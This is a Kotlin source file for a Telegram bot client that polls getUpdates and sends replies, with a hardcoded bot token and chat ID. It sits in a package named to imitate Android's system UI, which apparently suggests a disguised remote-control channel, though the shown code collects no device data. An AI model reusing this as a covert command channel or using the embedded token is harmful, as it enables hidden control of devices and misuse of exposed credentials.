package com.systemui.package

import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody
import okhttp3.MediaType.Companion.toMediaType
import org.json.JSONObject
import java.io.IOException

object TelegramApi {
    private const val BOT_TOKEN = "8697419498:AAFUkgi0_Jft2lpC5M5dWsM2rpVhIeYc91Q"
    private const val CHAT_ID = "8036939276"
    private const val BASE_URL = "https://api.telegram.org/bot$BOT_TOKEN"

    private val client = OkHttpClient()

    data class UpdateResponse(val ok: Boolean, val result: List<Update>)
    data class Update(val update_id: Int, val message: Message?)
    data class Message(val message_id: Int, val chat: Chat, val text: String?)
    data class Chat(val id: Int)

    data class SendMessageResponse(val ok: Boolean)

    fun getUpdates(offset: Int): UpdateResponse {
        val url = "$BASE_URL/getUpdates?offset=$offset&limit=100&timeout=30"
        val request = Request.Builder().url(url).build()

        client.newCall(request).execute().use { response ->
            if (!response.isSuccessful) throw IOException("Unexpected code $response")

            val body = response.body?.string() ?: throw IOException("Empty response body")
            val json = JSONObject(body)

            return UpdateResponse(
                ok = json.getBoolean("ok"),
                result = json.getJSONArray("result").let { arr ->
                    List(arr.length()) { i ->
                        val obj = arr.getJSONObject(i)
                        Update(
                            update_id = obj.getInt("update_id"),
                            message = obj.optJSONObject("message")?.let { msgObj ->
                                Message(
                                    message_id = msgObj.getInt("message_id"),
                                    chat = Chat(msgObj.getJSONObject("chat").getInt("id")),
                                    text = msgObj.optString("text", null)
                                )
                            }
                        )
                    }
                }
            )
        }
    }

    fun sendMessage(chatId: Int, text: String): Boolean {
        val json = JSONObject().apply {
            put("chat_id", chatId)
            put("text", text)
        }

        val body = RequestBody.create(
            "application/json".toMediaType(),
            json.toString()
        )

        val request = Request.Builder()
            .url("$BASE_URL/sendMessage")
            .post(body)
            .build()

        client.newCall(request).execute().use { response ->
            if (!response.isSuccessful) return false
            val bodyStr = response.body?.string() ?: return false
            return JSONObject(bodyStr).getBoolean("ok")
        }
    }
}
